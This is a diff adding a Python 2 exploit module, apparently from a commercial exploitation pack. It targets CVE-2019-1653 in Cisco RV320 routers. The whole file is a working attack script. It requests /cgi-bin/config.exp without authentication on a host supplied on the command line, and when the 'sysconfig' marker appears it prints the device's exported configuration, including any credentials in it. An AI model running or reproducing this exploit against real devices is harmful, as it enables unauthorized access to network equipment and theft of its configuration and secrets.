@@ -1,0 +1,41 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2019
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_cisco_5'
+_vendor_ = 'cisco'
+_model_  = ['ASA','RV320']
+_vuln_   = 'Configuration Export Vulnerability'
+_cve_    = 'CVE-2019-1653'
+_ref_    = 'https://www.redteam-pentesting.de/advisories/rt-sa-2018-002'
+_port_   = 443
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = "https://%s:%s/cgi-bin/config.exp" % (host,port)
+    response = requests.get(url, verify=False)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  if "####sysconfig####" in response.text:
+    print '[+] %s vulnerable' % host
+    print response.text  
+  else:
+    print '[+] %s not vulnerable' % host
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
